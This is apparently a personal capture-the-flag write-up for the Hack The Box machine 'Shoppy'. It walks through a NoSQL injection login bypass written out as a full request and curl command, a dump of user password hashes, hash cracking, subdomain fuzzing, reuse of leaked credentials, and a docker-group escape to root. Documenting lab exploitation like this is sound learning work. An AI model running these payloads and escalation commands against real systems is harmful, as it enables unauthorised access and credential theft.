# Shoppy

Spent forever trying to poke at the login form, but I could not find anything. 

In the end, what worked was this:

```
POST /login?error=WrongCredentials HTTP/1.1
Host: shoppy.htb
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

username=admin'%7c%7c'1'%3d%3d'1&password=admin
```

Or as curl:

```
curl -i -s -k -X $'POST' \
    -H $'Host: shoppy.htb' -H $'Content-Length: 47' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    --data-binary $'username=admin\'%7c%7c\'1\'%3d%3d\'1&password=admin' \
    $'http://shoppy.htb/login?error=WrongCredentials'
```

The payload is `admin'||'1'=='1` urlencoded. I will have to look at the code or query used after foothold to properly understand this! If I change any single quotes, it breaks!

# Exploit re-use

In the admin panel, there is a user search functionality. If I apply the same nosqli vulnerability to the search field I can get these data:

```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

I assume that the underlying database and code logic is the same, so it was the natural thing to try first.

Looks like some pretty tame hashes. Let's see if some online cracker will deal with it for us.

John the Ripper will crack one of them for us:

josh:remembermethisway

Sadly this password does not work for josh@shoppy.htb nor does it work for `jaeger`. The jaeger user appears in the exception stack trace if you try to bypass authentication with json and passing malformed json in the request.

# More wfuzz

```
$ wfuzz -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 11 --hc 404 -H "Host: FUZZ.shoppy.htb" http://shoppy.htb
```

With some help from my friends, I ran this wordlist and found the mattermost subdomain. I usually run the top domain files, but they did not contain this string so I felt super stuck!

Josh can log in to mattermost with the password from earlier! Going through the chats reveals some credentials for the user jaeger:

username: jaeger
password: Sh0ppyBest@pp!

These work for ssh as well!

One of the first things I always check is the output of `sudo -l`:

```
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

It took me a while to figure out the syntax for how to call this program as the deploy user, but I found out in the end:

```
$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password:
```

None of the passwords I have so far works for this. I thought taking this program to a reverse engineeering tool would be overkill for an easy box, so instead I tried to use strings:

```
strings /home/deploy/password-manager
```

But none of the strings looked like a password. After being stuck on this for a while, I got a hint to try some different encodings with `strings -e`. And it turns out the password string is visible if using the 16-bit littleendian encoding: 

```
$ strings -e l /home/deploy/password-manager
Sample
```

That doesn't sound much like a password either. But it is!

```
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

Now I can ssh or su as deploy user!

# Docker

Not a lot going on with this user - I tried all the basic stuff: sudo -l, suid, env, etc. Turns out this user is a member of the docker group. Let's see if they can run docker commands:

```
$ docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

It can! Linpeas also tagged this group as a potential attack vector. A few google searches and I'm reading an article about priv esc using Docker and they mention GTFOBins has an entry for this binary:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Turns out it's possible to run this command and mount the entire host filesystem and browse it that way. What a security risk!

I could confirm that alpine was already available on the host:

```
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
alpine       latest    d7d3d98c851f   10 months ago   5.53MB
```

And that's it, really! 

# Conclusion

Super interesting box! It was a little frustrating with the wordfile, but let this serve as a reminder for me to run more than one wordlist if I get stuck!

I didn't know about the different encoding options for `strings` - I will definitely keep that in mind going forward.

In the end, it would probably have been easier to just try and reverse engineer it and look for the string that way.

I also did not know about docker priv-esc. I guess it makes sense since docker requires root, right? But very interesting privesc that I will keep in mind!

# PS

Going back to understanding the nosql injection. This is the part in the code that handles the login query:

```
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
```

Or condensed:

```
this.username === '${username}' && this.password === '${passToTest}'
```

So let's substitute with the injection username:

```
this.username === 'admin'||'1'=='1' && this.password === '${passToTest}'
```

Looking at it now, I don't know why I was so confused. It looks pretty ordinary.

I think I got thrown off since most of the injection payloads online only use 1==1 and not '1'=='1'. In this case since I inject in the middle of two since quotes, I need to omit the initial and the final quote.
